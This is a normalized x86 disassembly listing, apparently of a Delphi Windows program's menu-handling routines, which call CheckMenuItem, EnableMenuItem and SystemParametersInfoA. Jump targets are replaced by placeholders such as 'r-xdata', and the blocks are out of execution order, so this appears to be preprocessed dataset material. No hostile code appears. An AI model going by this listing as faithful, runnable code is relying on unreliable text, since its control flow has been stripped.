mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_41d61c
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_41cb58
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_4030f0
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_443c4c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov bx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4450b3
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_442d10
mov eax [ ebp + 0x8 ]
mov [ eax - 0x20 ] 0xa
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov edx [ ebp - 0x4 ]
call sub_41d93c
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x20 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
push 0x2
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ ebp - 0x4 ]
call sub_443c4c
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_445200
push ebx
xor ebx ebx
mov edx [ eax + 0x64 ]
jmp r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
cmp [ edx + 0x7c ] 0x0
je r-xdata
call sub_445be4
test eax eax
je r-xdata
mov ebx [ edx + 0x7c ]
jmp r-xdata
mov edx [ edx + 0x64 ]
mov eax ebx
pop ebx
retn
mov ebx [ eax + 0x48 ]
sub_445230
push ebp
mov ebp esp
add esp 0xfffffeac
mov [ ebp - 0x154 ] 0x154
push 0x0
lea eax [ ebp - 0x154 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xbc ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0xb8 ]
mov [ eax ] edx
sub_44527c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
mov edi eax
xor eax eax
push ebp
push sub_44545e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov si 0xfff2
call sub_4032ec
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
xor ebx ebx
mov bl 0x1
push ebp
call sub_445230
pop ecx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x5
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffffe
xor eax eax
jmp r-xdata
mov eax edi
call sub_445be4
mov esi eax
mov eax edi
call sub_445200
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x30 ]
mov edx r-xdata
call sub_4042b8
jne r-xdata
cmp [ edi + 0x4c ] 0x0
je r-xdata
cmp [ edi + 0x40 ] 0xffffffff
jg r-xdata
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffff9
xor eax eax
mov eax [ edi + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x10
test bl bl
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
lea eax [ ebp - 0x20 ]
xor ecx ecx
mov edx 0x10
call sub_402b04
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax ] 0x3
mov eax [ ebp - 0x4 ]
add [ eax ] 0xf
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x10
mov eax esi
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
xor ebx ebx
mov bl [ esi + 0x60 ]
jmp r-xdata
mov si [ edi + 0x60 ]
test si si
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ edi + 0x30 ]
call sub_403f44
lea edx [ ebp - 0x24 ]
mov eax esi
call sub_442d10
mov ecx [ ebp - 0x24 ]
lea eax [ ebp - 0x10 ]
mov edx [ edi + 0x30 ]
call sub_4041b8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445465
lea eax [ ebp - 0x24 ]
call sub_403eac
lea eax [ ebp - 0x10 ]
call sub_403eac
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ edi + 0xa4 ]
call [ edi + 0xa0 ]
xor eax eax
mov al bl
mov ax [ eax * 2 + rw-data ]
or ax 0x40
or ax 0x20
or ax 0x100
or ax 0x400
movzx eax ax
lea edx [ ebp - 0x20 ]
push edx
push 0x0
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_443c4c
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
add eax 0x7
mov edx [ ebp - 0x4 ]
add [ edx ] eax
cmp [ edi + 0xa2 ] 0x0
je r-xdata
sub_445490
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
mov edx esi
call sub_4042b8
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x30 ]
mov edx esi
call sub_403f00
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_4454b8
push ebx
push esi
push edi
mov ebx eax
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_445628
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ eax + 0x3d ] 0x0
je r-xdata
mov edx edi
mov eax [ ebx + 0x64 ]
call sub_445638
cmp ebx eax
je r-xdata
mov dl [ eax + 0x3f ]
cmp dl [ ebx + 0x3f ]
jne r-xdata
xor edx edx
call sub_445500
sub_445500
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x38 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x38 ] bl
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
test bl bl
je r-xdata
test [ esi + 0x1c ] 0x2
jne r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_443bbc
push eax
call CheckMenuItem
mov eax esi
call sub_4454b8
sub_445554
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x39 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x39 ] bl
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov eax esi
call sub_445628
test eax eax
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
jmp r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
test [ esi + 0x1c ] 0x2
jne r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_443bbc
push eax
call EnableMenuItem
sub_4455cc
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x3f ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov [ esi + 0x3f ] bl
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov edx esi
mov eax edi
call sub_44598c
mov edx eax
mov ecx ebx
mov eax edi
call sub_443b5c
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov eax esi
call sub_4454b8
sub_445638
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_413860
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_442c64
sub_4456a8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_445628
test esi esi
jge r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax ebx
call sub_445690
cmp esi eax
je r-xdata
mov esi eax
dec esi
mov edi [ ebx + 0x64 ]
mov edx ebx
mov eax edi
call sub_4459c0
mov ecx ebx
mov edx esi
mov eax edi
call sub_4457b4
sub_4456f0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_445628
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_445638
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_445748
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x3a ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ ebp + 0x3a ] bl
mov dl 0x1
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebp + 0x64 ] 0x0
je r-xdata
mov eax [ ebp + 0x64 ]
call sub_445628
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_445638
mov [ eax + 0x3a ] 0x0
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_445638
cmp [ eax + 0x3a ] 0x0
je r-xdata
sub_4457b4
push ebx
push esi
push edi
push ebp
mov esi ecx
mov edi edx
mov ebx eax
cmp [ esi + 0x64 ] 0x0
je r-xdata
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_442c64
mov ebp edi
dec ebp
test ebp ebp
jl r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov [ ebx + 0x5c ] eax
mov cl [ esi + 0x3f ]
mov edx edi
mov eax ebx
call sub_443b5c
mov ecx esi
mov edx edi
mov eax [ ebx + 0x5c ]
call sub_4138dc
mov [ esi + 0x64 ] ebx
mov [ esi + 0x84 ] ebx
mov [ esi + 0x80 ] sub_445a2c
cmp [ ebx + 0x34 ] 0x0
je r-xdata
mov eax [ ebx + 0x5c ]
cmp ebp [ eax + 0x8 ]
jge r-xdata
mov eax ebx
call sub_445628
dec eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_443a8c
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_413860
mov al [ eax + 0x3f ]
cmp al [ esi + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_413860
mov dl [ eax + 0x3f ]
mov eax esi
call sub_4455cc
sub_445868
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_442c64
cmp [ ebx + 0x5c ] 0x0
je r-xdata
mov eax ebx
call sub_445628
test eax eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_443a8c
mov eax ebx
call sub_445628
cmp esi eax
jl r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_413860
mov edi eax
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_413750
xor eax eax
mov [ edi + 0x64 ] eax
xor eax eax
mov [ edi + 0x80 ] eax
mov [ edi + 0x84 ] eax
cmp [ ebx + 0x34 ] 0x0
je r-xdata
sub_4458dc
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x39 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
jne r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
jne r-xdata
mov dl [ ebx + 0x38 ]
xor dl 0x1
mov eax ebx
call sub_445500
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_445610
test eax eax
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
je r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov eax ebx
call sub_445610
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x88 ]
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
mov edx ebx
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
jmp r-xdata
sub_4459a4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_445628
mov edx eax
mov ecx esi
mov eax ebx
call sub_4457b4
pop esi
pop ebx
retn
sub_4459c0
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_44598c
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov edx esi
mov eax ebx
call sub_445868
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_442c64
sub_4459e8
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax esi
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
pop esi
pop ebx
retn
push ebx
mov ecx eax
mov edx esi
mov eax [ esi + 0x84 ]
call [ esi + 0x80 ]
xor eax eax
jmp r-xdata
cmp [ esi + 0x82 ] 0x0
je r-xdata
sub_445a2c
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
push 0x0
mov ecx esi
mov edx ebx
call sub_445a2c
jmp r-xdata
mov eax ebx
call sub_443a8c
cmp [ ebx + 0x6c ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov eax esi
call sub_447704
sub_445a84
push ebx
mov ebx eax
cmp [ ebx + 0x4c ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ ebx + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov eax [ ebx + 0x4c ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4201d4
mov [ ebx + 0x4c ] eax
sub_445aac
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov eax [ ebx + 0x44 ]
call sub_4030f0
xor eax eax
mov [ ebx + 0x44 ] eax
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x44 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_445d40
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_4032ec
mov edx ebx
mov eax edi
call sub_419bdc
mov eax ebx
mov si 0xffee
call sub_4032ec
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x44 ] eax
pop edi
pop esi
pop ebx
retn
sub_445b1c
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x4c ] 0x0
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4201d4
mov [ esi + 0x4c ] eax
sub_445b50
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_445628
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_445638
mov edx [ eax ]
call [ edx + 0x40 ]
inc esi
dec ebx
jne r-xdata
sub_445b90
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_4459c0
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
mov eax [ esi + 0x34 ]
mov edx ebx
call sub_4459a4
jmp r-xdata
mov edx ebx
mov eax esi
call sub_4459a4
sub_445bf4
push ebx
mov ebx eax
cmp dl [ ebx + 0x3d ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x3d ] dl
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebx + 0x3d ] 0x0
je r-xdata
mov eax ebx
call sub_4454b8
sub_445c20
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov eax edi
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov al [ edi + 0x95 ]
mov [ esi + 0xa8 ] al
cmp [ esi + 0xa8 ] 0x0
jne r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_445490
cmp [ esi + 0x30 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x69 ]
mov eax esi
call sub_445500
cmp [ esi + 0x38 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x6a ]
mov eax esi
call sub_445554
cmp [ esi + 0x39 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x74 ]
mov [ esi + 0x54 ] eax
cmp [ esi + 0x54 ] 0x0
jne r-xdata
test bl bl
je r-xdata
lea eax [ esi + 0x58 ]
mov edx [ edi + 0x7c ]
call sub_403f00
cmp [ esi + 0x58 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov edx [ edi + 0x80 ]
mov eax esi
call sub_445680
cmp [ esi + 0x40 ] 0xffffffff
jne r-xdata
mov dl [ edi + 0x6c ]
mov eax esi
call sub_4455cc
cmp [ esi + 0x3f ] 0x0
jne r-xdata
mov dx [ edi + 0x84 ]
mov eax esi
call sub_44565c
cmp [ esi + 0x60 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
call sub_445670
cmp [ esi + 0x3e ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x88 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x8c ] eax
cmp [ esi + 0x8a ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_445d40
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_445610
cmp edi eax
jne r-xdata
pop edi
pop esi
retn
xor ecx ecx
mov edx edi
mov eax esi
mov si 0xffef
call sub_4032ec
sub_445d64
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_445d84
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_445da4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_445dc4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_445de4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_445e04
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_445e24
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_445e44
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_445e64
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_445e84
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_413f40
mov dl [ ebx + 0x39 ]
mov edi esi
mov eax edi
call sub_44018c
mov edx [ ebx + 0x54 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x58 ]
mov eax edi
call sub_4402c4
mov edx [ ebx + 0x40 ]
mov eax edi
call sub_440324
mov edx [ ebx + 0x30 ]
mov eax edi
call sub_440024
mov dl [ ebx + 0x3e ]
mov eax edi
call sub_4403e4
push [ ebx + 0x8c ]
push [ ebx + 0x88 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_445efc
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_419e28
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_445610
cmp edi eax
jne r-xdata
cmp edi [ esi + 0x7c ]
jne r-xdata
xor edx edx
mov eax esi
call sub_445aac
jmp r-xdata
cmp edi [ esi + 0x68 ]
jne r-xdata
xor edx edx
mov eax esi
call sub_445f50
jmp r-xdata
xor edx edx
mov eax esi
call sub_443a14
sub_445f50
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x7c ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x7c ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x78 ]
call sub_4413e8
mov eax ebx
call sub_445fc0
pop esi
pop ebx
retn
mov edx [ ebx + 0x78 ]
call sub_44142c
mov edx ebx
mov eax [ ebx + 0x7c ]
call sub_419bdc
sub_445f98
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_445f98
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_4430e8
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_445a2c
mov eax ebx
pop esi
pop ebx
retn
sub_445fd4
push ebp
mov ebp esp
push ebx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_40be98
test eax eax
setne bl
test bl bl
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
add edx 0xfffffffc
mov ecx 0x1
xchg edx eax
call sub_40440c
sub_446004
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe8
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_403f44
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
pop ecx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_446088
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_4461aa
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax [ esi ]
call sub_40416c
test eax eax
jle r-xdata
test bl bl
je r-xdata
mov edi 0x1
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov eax [ esi ]
call sub_40416c
mov edx eax
sub edx 0x3
inc edx
mov eax [ esi ]
mov ecx 0x3
call sub_4043cc
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4042b8
jne r-xdata
inc edi
dec eax
jne r-xdata
mov bl 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4461b1
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403ed0
retn
mov edx esi
mov ecx [ ebp - 0x8 ]
mov eax r-xdata
call sub_404454
push [ esi ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
mov eax esi
mov edx 0x5
call sub_40422c
jmp r-xdata
